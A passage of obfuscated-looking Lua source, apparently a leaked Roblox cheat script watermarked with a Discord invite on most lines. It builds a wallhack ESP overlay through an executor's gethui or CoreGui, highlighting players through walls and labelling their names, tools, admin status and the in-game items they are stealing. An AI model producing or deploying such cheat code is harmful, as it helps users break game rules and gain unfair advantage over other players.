		local color = Color3.fromRGB
		tbl7[1] = sliced17
		tbl7[2] = sliced18

		do
			local values = table.pack(new(1, color(18, 0, 3)))  -- LEAKED BY SLICED | discord.gg/pubmethod
			table.move(values, 1, values.n, 3, tbl7)
		end

		sliced16 = colorSequence2(tbl7)
	end

	local tbl7

	tbl7 = {
		[""] = 1,
		K = 1000,
		M = 1000000,
		B = 1e9,  -- LEAKED BY SLICED | discord.gg/pubmethod
		T = 1e12,
		Qa = 1e15,
		Qi = 1e18,
		Sx = 1e21,
		Sp = 1e24,
		Oc = 1e27,
		No = 1e30,
		Dc = 1e33,
	}

	local tbl8 = {}  -- LEAKED BY SLICED | discord.gg/pubmethod
	local tbl9

	tbl9 = {
		Limit = 1000000,
		Fill = Color3.fromRGB(255, 196, 66),
		Outline = Color3.fromRGB(255, 232, 152),
	}

	do
		local colorSequence2 = ColorSequence.new
		local tbl10 = {}
		local sliced17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 231, 158))  -- LEAKED BY SLICED | discord.gg/pubmethod
		local sliced18 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 196, 66))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl10[1] = sliced17
		tbl10[2] = sliced18

		do
			local values = table.pack(new(1, color(214, 142, 12)))
			table.move(values, 1, values.n, 3, tbl10)
		end

		tbl9.Text = colorSequence2(tbl10)  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	do
		local colorSequence2 = ColorSequence.new
		local tbl10 = {}
		local sliced17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(122, 76, 0))
		local sliced18 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(62, 38, 0))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl10[1] = sliced17
		tbl10[2] = sliced18  -- LEAKED BY SLICED | discord.gg/pubmethod

		do
			local values = table.pack(new(1, color(20, 12, 0)))
			table.move(values, 1, values.n, 3, tbl10)
		end

		tbl9.Stroke = colorSequence2(tbl10)
	end

	do
		local tbl10 = {
			Limit = 10000000,
			Fill = Color3.fromRGB(255, 146, 40),  -- LEAKED BY SLICED | discord.gg/pubmethod
			Outline = Color3.fromRGB(255, 194, 112),
		}

		local colorSequence2 = ColorSequence.new
		local tbl11 = {}
		local sliced17 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 198, 132))
		local sliced18 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 146, 40))
		local new = ColorSequenceKeypoint.new
		local color = Color3.fromRGB
		tbl11[1] = sliced17
		tbl11[2] = sliced18  -- LEAKED BY SLICED | discord.gg/pubmethod

		do
			local values = table.pack(new(1, color(206, 92, 0)))
			table.move(values, 1, values.n, 3, tbl11)
		end

		tbl10.Text = colorSequence2(tbl11)
		local colorSequence3 = ColorSequence.new
		local tbl12 = {}
		local sliced19 = ColorSequenceKeypoint.new(0, Color3.fromRGB(112, 50, 0))
		local sliced20 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(56, 25, 0))
		local new2 = ColorSequenceKeypoint.new  -- LEAKED BY SLICED | discord.gg/pubmethod
		local color2 = Color3.fromRGB
		tbl12[1] = sliced19
		tbl12[2] = sliced20

		do
			local values = table.pack(new2(1, color2(18, 8, 0)))
			table.move(values, 1, values.n, 3, tbl12)
		end

		tbl10.Stroke = colorSequence3(tbl12)

		local tbl13 = {
			Limit = 100000000,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Fill = Color3.fromRGB(255, 82, 38),
			Outline = Color3.fromRGB(255, 140, 96),
		}

		local colorSequence4 = ColorSequence.new
		local tbl14 = {}
		local sliced21 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 158, 116))
		local sliced22 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 82, 38))
		local new3 = ColorSequenceKeypoint.new
		local color3 = Color3.fromRGB
		tbl14[1] = sliced21  -- LEAKED BY SLICED | discord.gg/pubmethod
		tbl14[2] = sliced22

		do
			local values = table.pack(new3(1, color3(196, 40, 0)))
			table.move(values, 1, values.n, 3, tbl14)
		end

		tbl13.Text = colorSequence4(tbl14)
		local colorSequence5 = ColorSequence.new
		local tbl15 = {}
		local sliced23 = ColorSequenceKeypoint.new(0, Color3.fromRGB(108, 24, 0))
		local sliced24 = ColorSequenceKeypoint.new(0.55, Color3.fromRGB(54, 12, 0))  -- LEAKED BY SLICED | discord.gg/pubmethod
		local new4 = ColorSequenceKeypoint.new
		local color4 = Color3.fromRGB
		tbl15[1] = sliced23
		tbl15[2] = sliced24

		do
			local values = table.pack(new4(1, color4(18, 4, 0)))
			table.move(values, 1, values.n, 3, tbl15)
		end

		tbl13.Stroke = colorSequence5(tbl15)

		local tbl16 = {  -- LEAKED BY SLICED | discord.gg/pubmethod
			Limit = math.huge,
			Fill = Color3.fromRGB(220, 12, 28),
			Outline = Color3.fromRGB(255, 55, 65),
			Text = sliced15,
			Stroke = sliced16,
		}

		tbl8[1] = tbl9
		tbl8[2] = tbl10
		tbl8[3] = tbl13
		tbl8[4] = tbl16  -- LEAKED BY SLICED | discord.gg/pubmethod
	end

	local slicedfn19

	local function slicedfn20(arg)
		if type(arg) ~= "string" then
			return nil
		end
		local match, str = arg:match("%$%s*([%d%.]+)%s*(%a*)")
		local num = tonumber(match)
		if not num then
			return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		if str ~= "" then
			str = str:sub(1, 1):upper() .. str:sub(2):lower()
		end

		return num * (tbl7[str] or 1)
	end

	slicedfn19 = function(arg)
		local sliced17 = slicedfn20(arg)
		if not sliced17 then
			return tbl8[#tbl8]  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		for _, sliced18 in ipairs(tbl8) do
			if sliced17 < sliced18.Limit then
				return sliced18
			end
		end

		return tbl8[#tbl8]
	end

	local screenGui

	do  -- LEAKED BY SLICED | discord.gg/pubmethod
		local function slicedfn21()
			if type(gethui) == "function" then
				local ok, result = pcall(gethui)
				if ok and typeof(result) == "Instance" then
					return result
				end
			end

			return CoreGui
		end

		local sliced17 = slicedfn21()  -- LEAKED BY SLICED | discord.gg/pubmethod
		local tbl10 = {}

		for _, sliced18 in ipairs({ sliced17, CoreGui }) do
			if sliced18 and not tbl10[sliced18] then
				tbl10[sliced18] = true
				local chilliPlayerESPRuntime = sliced18:FindFirstChild("__ChilliPlayerESPRuntime")

				if chilliPlayerESPRuntime then
					local cleanup = chilliPlayerESPRuntime:FindFirstChild("Cleanup")

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()  -- LEAKED BY SLICED | discord.gg/pubmethod
						end)
					end

					pcall(function()
						chilliPlayerESPRuntime:Destroy()
					end)
				end
			end
		end

		screenGui = Instance.new("ScreenGui")
		screenGui.Name = "__ChilliPlayerESPRuntime"  -- LEAKED BY SLICED | discord.gg/pubmethod
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 50
		screenGui.Parent = sliced17
	end

	local bindableEvent = Instance.new("BindableEvent")
	bindableEvent.Name = "Cleanup"
	bindableEvent.Parent = screenGui  -- LEAKED BY SLICED | discord.gg/pubmethod
	local flag8, tbl10, slicedn13, tbl11, tbl12, slicedn14, slicedfn21, slicedfn22, slicedfn23, slicedfn24

	do
		local sliced17 = screenGui
		flag8 = false

		tbl10 = {
			Name = true,
			Username = false,
			Avatar = true,
			Tool = true,
			Brainrot = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
			["Admin Panel"] = true,
		}

		slicedn13 = 1
		tbl11 = {}
		tbl12 = {}
		local tbl13 = {}
		slicedn14 = 0

		slicedfn21 = function(arg)
			for _, sliced18 in ipairs(arg) do
				if sliced18.Connected then  -- LEAKED BY SLICED | discord.gg/pubmethod
					sliced18:Disconnect()
				end
			end

			table.clear(arg)
		end

		slicedfn22 = function(arg)
			local nameDisplayHumanoid = arg.NameDisplayHumanoid
			local nameDisplayDistance = arg.NameDisplayDistance

			if nameDisplayHumanoid and nameDisplayHumanoid.Parent and nameDisplayDistance ~= nil then
				pcall(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
					nameDisplayHumanoid.NameDisplayDistance = nameDisplayDistance
				end)
			end

			arg.NameDisplayHumanoid = nil
			arg.NameDisplayDistance = nil
		end

		slicedfn23 = function(arg, nameDisplayHumanoid)
			nameDisplayHumanoid = nameDisplayHumanoid and nameDisplayHumanoid:FindFirstChildOfClass("Humanoid")
			if not nameDisplayHumanoid then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if arg.NameDisplayHumanoid ~= nameDisplayHumanoid then
				slicedfn22(arg)
				arg.NameDisplayHumanoid = nameDisplayHumanoid
				arg.NameDisplayDistance = nameDisplayHumanoid.NameDisplayDistance
			end

			nameDisplayHumanoid.NameDisplayDistance = 0
		end

		local function slicedfn25(arg)
			local str = tostring(arg or "")  -- LEAKED BY SLICED | discord.gg/pubmethod
			if str == "" then
				return ""
			end

			if str:match("^%d+$") then
				return "rbxassetid://" .. str
			end
			return str
		end

		local function slicedfn26(arg)
			if not arg or not arg:IsA("Tool") then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return ""
			end
			local sliced18 = slicedfn25(arg.TextureId)
			if sliced18 ~= "" then
				return sliced18
			end

			for _, sliced19 in ipairs({ "Icon", "Image", "Thumbnail", "TextureId" }) do
				local attribute = arg:GetAttribute(sliced19)
				if type(attribute) ~= "string" then
					continue  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
				sliced18 = slicedfn25(attribute)
				if sliced18 ~= "" then
					return sliced18
				end
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Decal") or descendant:IsA("Texture") then
					sliced18 = slicedfn25(descendant.Texture)
				elseif descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then  -- LEAKED BY SLICED | discord.gg/pubmethod
					sliced18 = slicedfn25(descendant.Image)
				end

				if sliced18 ~= "" then
					return sliced18
				end
			end

			return ""
		end

		local function slicedfn27(arg)
			return arg and arg:FindFirstChildOfClass("Tool") or nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		slicedfn24 = function(arg, arg2)
			for _, sliced18 in ipairs(tbl5) do
				local sliced19 = arg:FindFirstChild(sliced18)
				if sliced19 and sliced19:IsA("BasePart") then
					return sliced19
				end
			end

			return arg2
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn28(arg, arg2)
			if arg2 == arg then
				return Vector3.new(0, 3.1, 0)
			end
			local slicedn15 = arg.Position.Y - arg2.Position.Y
			if math.abs(slicedn15) <= slicedn11 then
				return Vector3.new(0, math.clamp(slicedn15 + 3.1, 3.8, 6), 0)
			end
			return Vector3.new(0, 4.8, 0)
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn29(arg, arg2)
			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
					local part0 = descendant.Part0
					local part1 = descendant.Part1
					local sliced18

					if part0 and not part0:IsDescendantOf(arg) then
						sliced18 = part0
					else
						local flag9 = part1 and not part1:IsDescendantOf(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
						local sliced19 = nil
						local sliced20 = nil

						if flag9 then
							sliced18 = part1
							part1 = part0
						else
							sliced18 = sliced19
							part1 = sliced20
						end
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if sliced18 and sliced18:IsA("BasePart") and sliced18.Parent == Workspace and part1 and part1:IsA("BasePart") and part1:IsDescendantOf(arg) and (sliced18.Position - arg2.Position).Magnitude <= slicedn9 then
						return sliced18, part1
					end
				end
			end

			return nil
		end

		local function slicedfn30(arg)
			if type(arg) ~= "string" or not arg:find("/s", 1, true) then
				return false  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			local match = arg:match("%$([%d%.]+)")
			local flag9 = match ~= nil

			if flag9 then
				flag9 = (tonumber(match) or 0) > 0
			end

			return flag9
		end

		local function slicedfn31(arg, arg2)
			for k, sliced18 in pairs(arg:GetAttributes()) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				if k ~= "__AssetDescendantCount" and arg2:GetAttribute(k) ~= sliced18 then
					return false
				end
			end

			return true
		end

		local function slicedfn32(arg)
			local generation = arg:FindFirstChild("Generation", true)
			if generation and generation:IsA("TextLabel") and slicedfn30(generation.Text) then
				return generation  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			local plots = Workspace:FindFirstChild("Plots")
			local debris = Workspace:FindFirstChild("Debris")
			if not plots or not debris then
				return nil
			end
			local tbl14 = {}
			local tbl15 = {}

			for _, child in ipairs(plots:GetChildren()) do
				for _, child2 in ipairs(child:GetChildren()) do  -- LEAKED BY SLICED | discord.gg/pubmethod
					if child2:IsA("Model") and child2.Name == arg.Name then
						local position = child2:GetPivot().Position
						tbl15[#tbl15 + 1] = position

						if slicedfn31(arg, child2) then
							tbl14[#tbl14 + 1] = position
						end
					end
				end
			end

			tbl14 = #tbl14 > 0 and tbl14 or tbl15  -- LEAKED BY SLICED | discord.gg/pubmethod
			if #tbl14 == 0 then
				return nil
			end
			local mutation = arg:FindFirstChild("Mutation", true)
			local text = mutation and mutation:IsA("TextLabel") and mutation.Text or nil
			local huge = math.huge
			local sliced18 = nil

			for _, child in ipairs(debris:GetChildren()) do
				if child.Name == "FastOverheadTemplate" and child:IsA("BasePart") then
					local animalOverhead = child:FindFirstChild("AnimalOverhead")  -- LEAKED BY SLICED | discord.gg/pubmethod
					local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
					local generation2 = animalOverhead and animalOverhead:FindFirstChild("Generation")
					animalOverhead = animalOverhead and animalOverhead:FindFirstChild("Mutation")

					if displayName and displayName:IsA("TextLabel") and displayName.Text == arg.Name and generation2 and generation2:IsA("TextLabel") and slicedfn30(generation2.Text) then
						local huge2 = math.huge

						for _, sliced19 in ipairs(tbl14) do
							huge2 = math.min(huge2, (child.Position - sliced19).Magnitude)
						end

						local flag9 = text and animalOverhead and animalOverhead:IsA("TextLabel") and animalOverhead.Text ~= text
						local slicedn15 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod

						if flag9 then
							slicedn15 = 1000
						end

						local slicedn16 = huge2 + slicedn15

						if slicedn16 < huge then
							huge = slicedn16
							sliced18 = generation2
						end
					end
				end  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			return sliced18
		end

		local function slicedfn33(arg)
			if not arg then
				return nil
			end
			local mutation = arg:FindFirstChild("Mutation", true)
			if mutation and mutation:IsA("TextLabel") then
				return mutation  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			return nil
		end

		local function slicedfn34(arg)
			if not (arg and arg.Parent and arg.Visible) then
				return nil
			end
			local str = tostring(arg.Text or "")
			if str == "" then
				return nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			local tbl14 = {
				Text = str,
				RichText = arg.RichText == true,
				Color = arg.TextColor3,
				Font = arg.FontFace,
				Gradient = nil,
				StrokeColor = nil,
			}

			local uiStroke = arg:FindFirstChildOfClass("UIStroke")  -- LEAKED BY SLICED | discord.gg/pubmethod

			if uiStroke then
				tbl14.StrokeColor = uiStroke.Color
			end

			local uiGradient = arg:FindFirstChildOfClass("UIGradient")

			if uiGradient then
				tbl14.Gradient = { Color = uiGradient.Color, Rotation = uiGradient.Rotation }
			end

			return tbl14
		end

		local function slicedfn35(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if arg:GetAttribute("Stealing") ~= true then
				return nil
			end
			local character_ = arg.Character
			local humanoidRootPart2 = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart2 then
				return nil
			end
			local huge = math.huge
			local sliced18 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod

			for _, child in ipairs(Workspace:GetChildren()) do
				if child:IsA("Model") and child ~= character_ and not Players:GetPlayerFromCharacter(child) and child.Name:sub(-6) ~= "_Clone" then
					local rootPart = child:FindFirstChild("RootPart") or child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")

					if rootPart and rootPart:IsA("BasePart") then
						local sliced19, sliced20 = slicedfn29(child, humanoidRootPart2)

						if sliced19 and sliced20 then
							local sliced21 = humanoidRootPart2.CFrame:PointToObjectSpace(sliced19.Position)
							local magnitude = (sliced20.Position - humanoidRootPart2.Position).Magnitude

							if math.abs(sliced21.X) <= 4 and sliced21.Y >= -2 and sliced21.Y <= 6 and sliced21.Z >= -6 and sliced21.Z <= 3 and magnitude <= slicedn10 then
								local slicedn15 = (sliced19.Position - humanoidRootPart2.Position).Magnitude + magnitude * 0.05  -- LEAKED BY SLICED | discord.gg/pubmethod

								if slicedn15 < huge then
									huge = slicedn15
									sliced18 = child
								end
							end
						end
					end
				end
			end

			if not sliced18 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return nil
			end
			local sliced19 = slicedfn32(sliced18)
			return sliced18.Name, sliced18, sliced19 and sliced19.Text or nil, sliced19, slicedfn33(sliced18)
		end

		local function slicedfn36()
			local currentCamera = Workspace.CurrentCamera
			return math.max(1, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.024, 26, 35) * slicedn13))
		end

		local function slicedfn37(text, font3, size)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local getTextBoundsParams = Instance.new("GetTextBoundsParams")
			getTextBoundsParams.Text = text
			getTextBoundsParams.Font = font3
			getTextBoundsParams.Size = size
			getTextBoundsParams.Width = 1000

			local ok, result = pcall(function()
				return TextService:GetTextBoundsAsync(getTextBoundsParams)
			end)

			getTextBoundsParams:Destroy()
			if ok then  -- LEAKED BY SLICED | discord.gg/pubmethod
				return result.X
			end
			return (utf8.len(text) or #text) * size * 0.56
		end

		local function slicedfn38(arg, color, arg2, arg3)
			arg.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			arg.Color = color
			arg.Enabled = true
			arg.LineJoinMode = Enum.LineJoinMode.Round
			arg.Transparency = 0  -- LEAKED BY SLICED | discord.gg/pubmethod

			local ok = pcall(function()
				arg.BorderOffset = UDim.new(0, 0)
				arg.BorderStrokePosition = Enum.BorderStrokePosition.Outer
				arg.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
			end)

			arg.Thickness = ok and arg2 or arg3
			return ok
		end

		local function createTextLabel(name, parent, zIndex)
			local textLabel = Instance.new("TextLabel")  -- LEAKED BY SLICED | discord.gg/pubmethod
			textLabel.Name = name
			textLabel.AnchorPoint = Vector2.new(0, 0.5)
			textLabel.BackgroundTransparency = 1
			textLabel.FontFace = font2
			textLabel.Text = ""
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.ZIndex = zIndex  -- LEAKED BY SLICED | discord.gg/pubmethod
			textLabel.Parent = parent
			return textLabel
		end

		local function slicedfn39(arg, hasTool)
			local sliced18 = slicedfn36()
			local visible = tbl10.Name == true
			local text = tbl10.Username == true
			local visible2 = tbl10.Avatar == true
			local flag9 = tbl10.Tool == true
			local visible3 = tbl10.Brainrot == true  -- LEAKED BY SLICED | discord.gg/pubmethod
			local visible4 = tbl10["Admin Panel"] == true
			local slicedn15 = visible2 and math.floor(sliced18 * 0.72) or 0
			local slicedn16 = flag9 and math.floor(sliced18 * 0.82) or 0
			local slicedn17 = math.floor(sliced18 * 0.7)
			local slicedn18 = math.max(1, math.floor(sliced18 * 0.04))
			local targetPlayer = arg.TargetPlayer
			text = text and targetPlayer.Name or targetPlayer.DisplayName
			arg.DisplayName.Text = text
			arg.NameShadow.Text = text
			local slicedn19 = math.floor(math.clamp(slicedfn37(arg.DisplayName.Text, font2, slicedn17) + 4, slicedn17, 230))  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced19 = flag9 and hasTool
			local slicedn20 = 0
			local slicedn21 = 0

			if visible2 then
				slicedn20 = 0 + slicedn15
			end

			local slicedn22 = 0

			if visible then
				if not (slicedn20 > 0) then
					slicedn22 = slicedn20  -- LEAKED BY SLICED | discord.gg/pubmethod
				else
					slicedn22 = slicedn20 + slicedn18
				end

				slicedn20 = slicedn22 + slicedn19
			end

			local slicedn23 = 0

			if sliced19 then
				if not (slicedn20 > 0) then
					slicedn23 = slicedn20
				else  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedn23 = slicedn20 + slicedn18
				end

				slicedn20 = slicedn23 + slicedn16
			end

			local slicedn24 = math.max(slicedn20, 1)
			visible3 = visible3 and type(arg.BrainrotName) == "string" and arg.BrainrotName ~= ""
			local slicedn25 = math.floor(sliced18 * 0.88)
			local slicedn26 = -math.max(2, math.floor(sliced18 * 0.16))
			local brainrotName = visible3 and arg.BrainrotName or ""
			local slicedn27 = visible3 and math.floor(math.clamp(slicedfn37(brainrotName, font2, slicedn25) + 6, slicedn25, 320)) or 0  -- LEAKED BY SLICED | discord.gg/pubmethod
			local visible5 = visible3 and type(arg.BrainrotGeneration) == "string" and arg.BrainrotGeneration ~= ""
			local brainrotGeneration = visible5 and arg.BrainrotGeneration or ""
			local slicedn28 = math.max(2, math.floor(sliced18 * 0.12))
			local slicedn29 = visible5 and math.floor(math.clamp(slicedfn37(brainrotGeneration, font2, slicedn25) + 4, slicedn25, 150)) or 0
			local slicedn30 = slicedn27 + (visible5 and slicedn28 + slicedn29 or 0)
			local slicedn31 = visible and slicedn22 + slicedn19 * 0.5 or slicedn24 * 0.5
			local slicedn32 = slicedn31 - slicedn30 * 0.5
			local slicedn33 = math.min(0, slicedn32)
			local slicedn34 = math.max(slicedn24, slicedn32 + slicedn30)
			local sliced20 = math.ceil(slicedn34 - slicedn33)  -- LEAKED BY SLICED | discord.gg/pubmethod
			visible4 = visible4 and arg.IsAdmin == true
			local slicedn35 = math.max(1, math.floor(sliced18 * 0.6))
			local slicedn36 = visible4 and math.floor(math.clamp(slicedfn37("Admin Panel", font, slicedn35) + 3, slicedn35, 150)) or 0
			local slicedn37 = slicedn35 + -math.max(2, math.floor(sliced18 * 0.2))
			local brainrotMutation = visible3 and arg.BrainrotMutation or nil
			local visible6 = brainrotMutation ~= nil
			local slicedn38 = math.floor(sliced18 * 0.62)
			local slicedn39 = -math.max(1, math.floor(sliced18 * 0.1))
			local slicedn40 = visible6 and math.floor(math.clamp(slicedfn37(brainrotMutation.Text:gsub("<[^<>]->", ""), font2, slicedn38) + 6, slicedn38, 260)) or 0
			local slicedn41 = visible6 and slicedn38 + slicedn39 or 0  -- LEAKED BY SLICED | discord.gg/pubmethod
			local slicedn42 = slicedn31 - slicedn40 * 0.5
			local slicedn43

			if visible6 then
				slicedn43 = math.min(slicedn33, slicedn42)
				sliced20 = math.ceil(math.max(slicedn34, slicedn42 + slicedn40) - slicedn43)
			else
				slicedn43 = slicedn33
			end

			local slicedn44 = visible3 and slicedn25 + slicedn26 or 0
			local slicedn45 = slicedn37 + slicedn41 + slicedn44 + sliced18  -- LEAKED BY SLICED | discord.gg/pubmethod
			local slicedn46 = -slicedn43
			local slicedn47 = slicedn46 + slicedn32
			local slicedn48 = (slicedn37 + slicedn41 + slicedn44 + sliced18 * 0.5) / slicedn45
			local slicedn49 = visible3 and (slicedn37 + slicedn41 + slicedn25 * 0.5) / slicedn45 or 0
			local slicedn50 = visible6 and (slicedn37 + slicedn38 * 0.5) / slicedn45 or 0
			local slicedn51 = visible4 and slicedn35 * 0.5 / slicedn45 or 0
			local slicedn52 = 1 / sliced20
			local slicedn53 = 1 / slicedn45
			arg.HasTool = hasTool
			arg.Billboard.Size = UDim2.fromOffset(sliced20, slicedn45)  -- LEAKED BY SLICED | discord.gg/pubmethod
			arg.DisplayName.Visible = visible
			arg.NameShadow.Visible = visible
			arg.Avatar.Visible = visible2
			arg.ToolIcon.Visible = flag9 and arg.ToolIcon.Image ~= ""
			arg.ToolShadow.Visible = flag9 and arg.ToolShadow.Image ~= ""
			arg.Avatar.Position = UDim2.fromScale((slicedn46 + slicedn21) / sliced20, slicedn48)
			arg.Avatar.Size = UDim2.fromScale(slicedn15 / sliced20, slicedn15 / slicedn45)
			arg.DisplayName.Position = UDim2.fromScale((slicedn46 + slicedn22) / sliced20, slicedn48)
			arg.DisplayName.Size = UDim2.fromScale(slicedn19 / sliced20, slicedn17 / slicedn45)
			arg.NameShadow.Position = UDim2.fromScale((slicedn46 + slicedn22) / sliced20 + slicedn52, slicedn48 + slicedn53)  -- LEAKED BY SLICED | discord.gg/pubmethod
			arg.NameShadow.Size = arg.DisplayName.Size
			arg.ToolIcon.Position = UDim2.fromScale((slicedn46 + slicedn23) / sliced20, slicedn48)
			arg.ToolIcon.Size = UDim2.fromScale(slicedn16 / sliced20, slicedn16 / slicedn45)
			arg.ToolShadow.Position = UDim2.fromScale((slicedn46 + slicedn23) / sliced20 + slicedn52, slicedn48 + slicedn53)
			arg.ToolShadow.Size = arg.ToolIcon.Size
			arg.AdminLine.Visible = visible4

			if visible4 then
				arg.AdminLine.Position = UDim2.fromScale((slicedn46 + slicedn31) / sliced20, slicedn51)
				arg.AdminLine.Size = UDim2.fromScale(slicedn36 / sliced20, slicedn35 / slicedn45)
				arg.AdminText.Position = UDim2.fromScale(0, 0.5)  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.AdminText.Size = UDim2.fromScale(slicedn36 / slicedn36, 1)
				arg.AdminShadow.Position = UDim2.fromScale(1 / slicedn36, 0.5 + 1 / slicedn35)
				arg.AdminShadow.Size = arg.AdminText.Size
			end

			arg.MutationText.Visible = visible6
			arg.MutationShadow.Visible = visible6

			if visible6 then
				arg.MutationText.RichText = brainrotMutation.RichText
				arg.MutationText.Text = brainrotMutation.Text
				arg.MutationText.TextColor3 = brainrotMutation.Color  -- LEAKED BY SLICED | discord.gg/pubmethod

				if brainrotMutation.Font then
					arg.MutationText.FontFace = brainrotMutation.Font
					arg.MutationShadow.FontFace = brainrotMutation.Font
				end

				local uiStroke = arg.MutationText:FindFirstChildOfClass("UIStroke")

				if uiStroke and brainrotMutation.StrokeColor then
					uiStroke.Color = brainrotMutation.StrokeColor
				end

				arg.MutationShadow.RichText = false
				arg.MutationShadow.Text = brainrotMutation.Text:gsub("<[^<>]->", "")  -- LEAKED BY SLICED | discord.gg/pubmethod

				if brainrotMutation.Gradient then
					arg.MutationGradient.Color = brainrotMutation.Gradient.Color
					arg.MutationGradient.Rotation = brainrotMutation.Gradient.Rotation
					arg.MutationGradient.Enabled = true
				else
					arg.MutationGradient.Enabled = false
				end

				arg.MutationText.Position = UDim2.fromScale((slicedn46 + slicedn42) / sliced20, slicedn50)
				arg.MutationText.Size = UDim2.fromScale(slicedn40 / sliced20, slicedn38 / slicedn45)
				arg.MutationShadow.Position = UDim2.fromScale((slicedn46 + slicedn42) / sliced20 + slicedn52, slicedn50 + slicedn53)  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.MutationShadow.Size = arg.MutationText.Size
			end

			arg.BrainrotText.Text = brainrotName
			arg.BrainrotShadow.Text = brainrotName
			arg.BrainrotText.Visible = visible3
			arg.BrainrotShadow.Visible = visible3
			arg.GenerationText.Text = brainrotGeneration
			arg.GenerationShadow.Text = brainrotGeneration
			arg.GenerationText.Visible = visible5
			arg.GenerationShadow.Visible = visible5  -- LEAKED BY SLICED | discord.gg/pubmethod

			if visible3 then
				local slicedn54 = slicedn47 / sliced20
				arg.BrainrotText.Position = UDim2.fromScale(slicedn54, slicedn49)
				arg.BrainrotText.Size = UDim2.fromScale(slicedn27 / sliced20, slicedn25 / slicedn45)
				arg.BrainrotShadow.Position = UDim2.fromScale(slicedn54 + slicedn52, slicedn49 + slicedn53)
				arg.BrainrotShadow.Size = arg.BrainrotText.Size

				if visible5 then
					local slicedn55 = (slicedn47 + slicedn27 + slicedn28) / sliced20
					arg.GenerationText.Position = UDim2.fromScale(slicedn55, slicedn49)
					arg.GenerationText.Size = UDim2.fromScale(slicedn29 / sliced20, slicedn25 / slicedn45)  -- LEAKED BY SLICED | discord.gg/pubmethod
					arg.GenerationShadow.Position = UDim2.fromScale(slicedn55 + slicedn52, slicedn49 + slicedn53)
					arg.GenerationShadow.Size = arg.GenerationText.Size
				end
			end
		end

		local function slicedfn40(arg, arg2, arg3)
			local sliced18 = arg3 or arg2
			local highlight = Instance.new("Highlight")
			highlight.Name = "PlayerHighlight"
			highlight.Adornee = arg2.Parent  -- LEAKED BY SLICED | discord.gg/pubmethod
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.FillColor = Color3.fromRGB(0, 67, 148)
			highlight.FillTransparency = 0.76
			highlight.OutlineColor = Color3.fromRGB(72, 207, 255)
			highlight.OutlineTransparency = 0.02
			highlight.Parent = sliced17
			local billboardGui = Instance.new("BillboardGui")
			billboardGui.Name = "PlayerTag"
			billboardGui.Adornee = sliced18
			billboardGui.AlwaysOnTop = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			billboardGui.LightInfluence = 0
			billboardGui.MaxDistance = 1000
			billboardGui.Size = UDim2.fromOffset(1, 1)
			billboardGui.StudsOffsetWorldSpace = slicedfn28(arg2, sliced18)
			billboardGui.Parent = sliced17
			local boxHandleAdornment = Instance.new("BoxHandleAdornment")
			boxHandleAdornment.Name = "NetworkPosition"
			boxHandleAdornment.Adornee = sliced18
			boxHandleAdornment.AlwaysOnTop = true
			boxHandleAdornment.CFrame = CFrame.new(0, 1.2, 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
			boxHandleAdornment.Color3 = Color3.fromRGB(72, 207, 255)
			boxHandleAdornment.Size = Vector3.new(3.2, 5.2, 2.2)
			boxHandleAdornment.Transparency = 0.78
			boxHandleAdornment.Visible = false
